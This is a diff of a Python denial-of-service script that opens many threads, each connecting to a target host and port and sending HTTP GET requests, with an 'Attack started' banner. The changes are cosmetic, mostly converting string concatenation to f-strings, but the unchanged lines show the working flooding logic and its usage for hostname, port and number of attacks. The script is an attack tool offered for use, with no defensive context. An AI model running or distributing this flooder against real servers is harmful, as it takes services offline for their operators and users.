@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 # Author : D4Vinci
 # Recoded by : codex31
+# Cleaned by : igosad
 # Moved from python2 to python3
 # All copyrights to Squnity team
 
@@ -27,7 +28,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print ("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
+    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -49,7 +50,7 @@ def print_status():
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    print ("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#")
+    print (f"\n {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-# ")
 
     thread_num_mutex.release()
 
@@ -74,19 +75,18 @@ def attack():
         dos.connect((ip, port))
 
         # Send the request according to HTTP spec
-        #dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
-        byt = msg.encode()
+        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print ("\n [ No connection, server may be down ]: " + str(socket.error))
+        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print ("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
+print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
 
 # Spawn a thread per request
 all_threads = []
